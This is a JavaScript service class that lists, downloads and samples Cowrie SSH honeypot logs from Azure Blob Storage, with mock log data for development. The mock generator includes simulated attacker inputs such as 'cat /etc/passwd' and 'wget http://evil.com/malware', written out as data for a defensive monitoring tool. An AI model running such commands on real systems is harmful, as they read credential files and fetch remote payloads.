const { BlobServiceClient, ContainerClient } = require('@azure/storage-blob');

class AzureBlobService {
  constructor() {
    this.connectionString = process.env.AZURE_STORAGE_CONNECTION_STRING;
    this.sasUrl = process.env.AZURE_SAS_URL;
    this.containerName = process.env.AZURE_CONTAINER_NAME || 'cowrie-logs';
    this.logPrefix = process.env.AZURE_LOG_PREFIX || '';
    this.isDevelopment = !this.connectionString && !this.sasUrl;
    this.debugLogs = process.env.DEBUG_LOGS === 'true';
    
    if (!this.isDevelopment) {
      try {
        if (this.connectionString) {
          this.blobServiceClient = BlobServiceClient.fromConnectionString(this.connectionString);
          this.containerClient = this.blobServiceClient.getContainerClient(this.containerName);
          console.log(`✅ Connected to Azure Storage Account via connection string`);
        } else if (this.sasUrl) {
          // Extract storage account and container from SAS URL
          const url = new URL(this.sasUrl);
          const accountName = url.hostname.split('.')[0];
          this.containerClient = new ContainerClient(this.sasUrl);
          console.log(`✅ Connected to Azure Storage Account via SAS URL`);
          console.log(`🏢 Account: ${accountName}`);
        }
        
        console.log(`📁 Container: ${this.containerName}`);
        if (this.logPrefix) {
          console.log(`📂 Log prefix: ${this.logPrefix}`);
        }
      } catch (error) {
        console.error('❌ Failed to initialize Azure Blob Service:', error.message);
        throw new Error(`Azure Storage configuration error: ${error.message}`);
      }
    } else {
      console.log('🔧 Running in development mode - Azure Blob Storage will be mocked');
    }
  }

  async testConnection() {
    if (this.isDevelopment) {
      return { status: 'development', message: 'Using mock data' };
    }

    try {
      if (this.sasUrl) {
        // For SAS URLs, try to list a few blobs instead of getting container properties
        // since SAS tokens might not have container-level permissions
        const iterator = this.containerClient.listBlobsFlat({ maxPageSize: 1 });
        const result = await iterator.next();
        
        return {
          status: 'connected',
          container: this.containerName,
          connectionType: 'SAS URL',
          hasBlobs: !result.done,
          message: 'Connected via SAS URL'
        };
      } else {
        // Test connection by trying to get container properties
        const properties = await this.containerClient.getProperties();
        return {
          status: 'connected',
          container: this.containerName,
          connectionType: 'Connection String',
          lastModified: properties.lastModified,
          etag: properties.etag
        };
      }
    } catch (error) {
      console.error('Azure Storage connection test failed:', error);
      return {
        status: 'error',
        message: error.message,
        code: error.code
      };
    }
  }

  async listLogFiles(prefix = '', maxResults = 100) {
    if (this.isDevelopment) {
      return this.getMockBlobs();
    }

    try {
      const searchPrefix = this.logPrefix + prefix;
      const blobs = [];
      
      if (this.debugLogs) {
        console.log(`🔍 Searching for blobs with prefix: "${searchPrefix}"`);
      }
      
      // Add timeout to prevent hanging
      const timeout = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Listing operation timed out')), 30000) // 30 second timeout
      );
      
      const listOperation = (async () => {
        for await (const blob of this.containerClient.listBlobsFlat({ 
          prefix: searchPrefix, 
          maxPageSize: Math.min(maxResults, 1000) // Limit page size
        })) {
          blobs.push({
            name: blob.name,
            lastModified: blob.properties.lastModified,
            size: blob.properties.contentLength,
            creationTime: blob.properties.creationTime
          });
          
          if (this.debugLogs && blobs.length % 100 === 0) {
            console.log(`📄 Found ${blobs.length} blobs so far...`);
          }
          
          // Stop if we've reached the maximum results
          if (blobs.length >= maxResults) {
            break;
          }
        }
        return blobs;
      })();
      
      const resultBlobs = await Promise.race([listOperation, timeout]);
      const sortedBlobs = resultBlobs.sort((a, b) => new Date(b.lastModified) - new Date(a.lastModified));
      
      console.log(`📊 Found ${sortedBlobs.length} log files in Azure Storage`);
      return sortedBlobs.slice(0, maxResults); // Ensure we don't exceed the limit
    } catch (error) {
      console.error('❌ Error listing log files from Azure Storage:', error);
      if (error.message === 'Listing operation timed out') {
        throw new Error('Azure Storage listing timed out. Please try again with a shorter time range.');
      } else if (error.code === 'ContainerNotFound') {
        throw new Error(`Container '${this.containerName}' not found. Please check your container name.`);
      } else if (error.code === 'InvalidAuthenticationInfo') {
        throw new Error('Invalid Azure Storage credentials. Please check your connection string.');
      } else {
        throw new Error(`Failed to list log files: ${error.message}`);
      }
    }
  }

  async downloadLogFile(blobName) {
    if (this.isDevelopment) {
      return this.getMockBlobContent(blobName);
    }

    try {
      if (this.debugLogs) {
        console.log(`⬇️ Downloading blob: ${blobName}`);
      }
      
      const blobClient = this.containerClient.getBlobClient(blobName);
      
      // Add timeout to prevent hanging downloads
      const timeout = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Download operation timed out')), 60000) // 60 second timeout
      );
      
      const downloadOperation = (async () => {
        // Check if blob exists
        const exists = await blobClient.exists();
        if (!exists) {
          throw new Error(`Blob '${blobName}' not found`);
        }
        
        const downloadResponse = await blobClient.download();
        const content = await this.streamToBuffer(downloadResponse.readableStreamBody);
        
        if (this.debugLogs) {
          console.log(`✅ Downloaded ${blobName}: ${this.formatBytes(content.length)}`);
        }
        
        return content.toString();
      })();
      
      return await Promise.race([downloadOperation, timeout]);
    } catch (error) {
      console.error(`❌ Error downloading log file ${blobName}:`, error);
      if (error.message === 'Download operation timed out') {
        throw new Error(`Download of '${blobName}' timed out. File may be too large.`);
      }
      throw new Error(`Failed to download log file '${blobName}': ${error.message}`);
    }
  }

  async downloadLogFiles(blobNames) {
    try {
      const promises = blobNames.map(name => this.downloadLogFile(name));
      const results = await Promise.all(promises);
      return results.join('\n');
    } catch (error) {
      console.error('Error downloading multiple log files:', error);
      throw new Error('Failed to download log files');
    }
  }

  // Memory-efficient method that processes logs without loading everything into memory
  async getRecentLogs(hours = 24, maxFiles = 10) {
    if (this.isDevelopment) {
      return this.getMockBlobContent('recent-logs.json');
    }

    try {
      const cutoffTime = new Date(Date.now() - (hours * 60 * 60 * 1000));
      
      // Get a smaller sample of files to avoid memory issues
      const allFiles = await this.listLogFiles('', Math.min(maxFiles, 100));
      
      const recentFiles = allFiles.filter(file => 
        new Date(file.lastModified) > cutoffTime
      ).slice(0, maxFiles); // Further limit to prevent memory overload
      
      if (recentFiles.length === 0) {
        console.log(`📊 No log files found within the last ${hours} hours`);
        return '';
      }
      
      const totalSize = recentFiles.reduce((sum, file) => sum + file.size, 0);
      console.log(`📊 Found ${recentFiles.length} log files within the last ${hours} hours`);
      console.log(`📊 Total size: ${this.formatBytes(totalSize)}`);
      
      // If total size is too large, reduce the number of files
      const MAX_MEMORY_MB = 50; // 50MB limit
      const maxBytes = MAX_MEMORY_MB * 1024 * 1024;
      
      if (totalSize > maxBytes) {
        console.log(`⚠️ Total size ${this.formatBytes(totalSize)} exceeds ${MAX_MEMORY_MB}MB limit, reducing file count`);
        let accumulatedSize = 0;
        const safeFiles = [];
        
        for (const file of recentFiles) {
          if (accumulatedSize + file.size <= maxBytes) {
            safeFiles.push(file);
            accumulatedSize += file.size;
          } else {
            break;
          }
        }
        
        console.log(`📊 Reduced to ${safeFiles.length} files (${this.formatBytes(accumulatedSize)})`);
        const fileNames = safeFiles.map(file => file.name);
        return await this.downloadLogFiles(fileNames);
      }
      
      const fileNames = recentFiles.map(file => file.name);
      const content = await this.downloadLogFiles(fileNames);
      
      console.log(`📊 Downloaded ${this.formatBytes(content.length)} of log data`);
      return content;
    } catch (error) {
      console.error('Error getting recent logs:', error);
      throw new Error('Failed to get recent logs');
    }
  }

  // Streaming analytics method that processes files one by one to avoid memory overload
  async getStreamingAnalytics(hours = 24, maxFiles = 5) {
    if (this.isDevelopment) {
      return { processedFiles: 0, totalLines: 100, sampleData: this.getMockBlobContent('recent-logs.json') };
    }

    try {
      const cutoffTime = new Date(Date.now() - (hours * 60 * 60 * 1000));
      
      // Get only the most recent files to avoid memory issues
      const allFiles = await this.listLogFiles('', Math.min(maxFiles, 50));
      
      const recentFiles = allFiles.filter(file => 
        new Date(file.lastModified) > cutoffTime
      ).slice(0, maxFiles); // Strict limit for streaming
      
      if (recentFiles.length === 0) {
        console.log(`📊 No log files found within the last ${hours} hours for streaming analytics`);
        return { processedFiles: 0, totalLines: 0, sampleData: '' };
      }
      
      console.log(`🔄 Starting streaming analytics for ${recentFiles.length} files`);
      let totalLines = 0;
      let processedFiles = 0;
      let combinedContent = '';
      
      // Process files one by one to control memory usage
      for (const file of recentFiles.slice(0, maxFiles)) {
        try {
          console.log(`🔄 Processing file: ${file.name} (${this.formatBytes(file.size)})`);
          
          // Skip very large files to prevent memory issues
          if (file.size > 10 * 1024 * 1024) { // Skip files larger than 10MB
            console.log(`⚠️ Skipping large file: ${file.name} (${this.formatBytes(file.size)})`);
            continue;
          }
          
          const content = await this.downloadLogFile(file.name);
          const lines = content.split('\n').filter(line => line.trim());
          totalLines += lines.length;
          
          // Keep only a sample of lines to avoid memory buildup
          const sampleLines = lines.slice(0, 50); // Take first 50 lines from each file
          combinedContent += sampleLines.join('\n') + '\n';
          
          processedFiles++;
          console.log(`✅ Processed ${file.name}: ${lines.length} lines`);
          
          // Limit total content size
          if (combinedContent.length > 1024 * 1024) { // 1MB limit for combined content
            console.log(`📊 Reached content size limit, stopping processing`);
            break;
          }
          
        } catch (fileError) {
          console.error(`❌ Error processing file ${file.name}:`, fileError.message);
          continue; // Skip this file and continue with others
        }
      }
      
      console.log(`📊 Streaming analytics complete: ${processedFiles} files, ${totalLines} total lines`);
      return { 
        processedFiles, 
        totalLines, 
        sampleData: combinedContent,
        filesAnalyzed: recentFiles.slice(0, processedFiles).map(f => ({
          name: f.name,
          size: f.size,
          lastModified: f.lastModified
        }))
      };
      
    } catch (error) {
      console.error('Error in streaming analytics:', error);
      throw new Error('Failed to perform streaming analytics');
    }
  }

  async streamToBuffer(readableStream) {
    return new Promise((resolve, reject) => {
      const chunks = [];
      readableStream.on('data', (data) => {
        chunks.push(data instanceof Buffer ? data : Buffer.from(data));
      });
      readableStream.on('end', () => {
        resolve(Buffer.concat(chunks));
      });
      readableStream.on('error', reject);
    });
  }

  // Mock data for development
  getMockBlobs() {
    const now = new Date();
    const blobs = [];
    
    for (let i = 0; i < 5; i++) {
      const date = new Date(now - i * 60 * 60 * 1000); // Each blob is 1 hour older
      blobs.push({
        name: `cowrie-logs/cowrie-${date.toISOString().split('T')[0]}-${i}.json`,
        lastModified: date,
        size: 1024 + i * 512,
        creationTime: date
      });
    }
    
    return blobs;
  }

  getMockBlobContent(blobName) {
    const now = new Date();
    const mockLogs = [];
    
    // Generate mock Cowrie log entries
    const mockIPs = ['192.168.1.100', '10.0.0.50', '172.16.0.10', '203.0.113.1', '198.51.100.1'];
    const mockUsernames = ['admin', 'root', 'user', 'test', 'guest', 'oracle', 'postgres'];
    const mockPasswords = ['123456', 'password', 'admin', 'root', '12345', 'qwerty', 'letmein'];
    const mockEvents = ['cowrie.login.failed', 'cowrie.login.success', 'cowrie.session.connect', 'cowrie.command.input'];
    
    for (let i = 0; i < 50; i++) {
      const timestamp = new Date(now - Math.random() * 24 * 60 * 60 * 1000); // Random time in last 24h
      const srcIP = mockIPs[Math.floor(Math.random() * mockIPs.length)];
      const username = mockUsernames[Math.floor(Math.random() * mockUsernames.length)];
      const password = mockPasswords[Math.floor(Math.random() * mockPasswords.length)];
      const eventid = mockEvents[Math.floor(Math.random() * mockEvents.length)];
      
      const logEntry = {
        timestamp: timestamp.toISOString(),
        session: `session_${Math.random().toString(36).substr(2, 9)}`,
        src_ip: srcIP,
        src_port: Math.floor(Math.random() * 60000) + 1024,
        dst_ip: '192.168.1.1',
        dst_port: 2222,
        protocol: 'ssh',
        eventid: eventid,
        message: `Mock ${eventid} event from ${srcIP}`
      };
      
      if (eventid.includes('login')) {
        logEntry.username = username;
        logEntry.password = password;
      }
      
      if (eventid === 'cowrie.command.input') {
        logEntry.input = ['ls', 'pwd', 'whoami', 'cat /etc/passwd', 'wget http://evil.com/malware'][Math.floor(Math.random() * 5)];
      }
      
      mockLogs.push(JSON.stringify(logEntry));
    }
    
    return mockLogs.join('\n');
  }

  formatBytes(bytes, decimals = 2) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
  }
}

module.exports = AzureBlobService;

module.exports = AzureBlobService;
